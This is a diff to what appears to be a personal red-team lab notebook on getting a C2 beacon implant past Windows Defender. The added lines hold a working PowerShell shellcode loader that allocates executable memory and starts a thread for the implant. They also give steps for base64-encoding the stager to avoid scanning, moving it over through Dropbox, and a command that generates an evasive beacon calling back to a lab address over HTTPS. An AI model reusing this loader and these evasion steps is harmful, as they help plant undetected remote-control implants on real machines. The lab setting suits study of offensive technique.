@@ -148,5 +148,35 @@ We use a loader as it is a way to execute the stager more stealthily. Supposedly
 ### March 23
 Using above stealth-stager, Base64-encode the stager: `base64 stealth-stager.bin > shellcode.txt`. Use DropBox to transfer onto Windows Machine. Tried using .7z to encrypt the file for better stealth when getting it onto the Windows System (try to avoid scanning), but Windows by default does not come with any tools that can extract .7z files. So I tried transferring the base64-encoded stager `shellcode.txt` to the Windows machine using DropBox and Defender didn't flag it (this is because base64 encode makes it appear as a regular txt file).
 
-so FUCK ME THIS WAS JUST A BEACON IMPLANT ALL ALONG. We're gonna see if we can get it to run without Defender detecting. 
+so F*** ME THIS WAS JUST A BEACON IMPLANT ALL ALONG. We're gonna see if we can get it to run without Defender detecting. 
+
+Powershell command to run the beacon implant .bin.
+```
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Exec {
+    [DllImport("kernel32")]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("msvcrt")]
+    public static extern IntPtr memcpy(IntPtr dest, byte[] src, int count);
+}
+"@
+
+$shellcode = [System.IO.File]::ReadAllBytes("C:\Users\w11vi\Downloads\bacon.bin")
+$size = $shellcode.Length
+$mem = [Exec]::VirtualAlloc(0, $size, 0x3000, 0x40)
+[Exec]::memcpy($mem, $shellcode, $size)
+[Exec]::CreateThread(0, 0, $mem, 0, 0, 0)
+```
+Generating a default executable beacon implant to see if Windows Defender will pick it up: ` generate beacon --name exe-beacon --format exe --arch amd64 --http https://192.168.56.1:8443 --c2profile default --evasion` (Tried transferring onto Windows raw .exe file AND base64 encoded - GOT FLAGGED - executables are easily flagged)
+
+
+
+
 
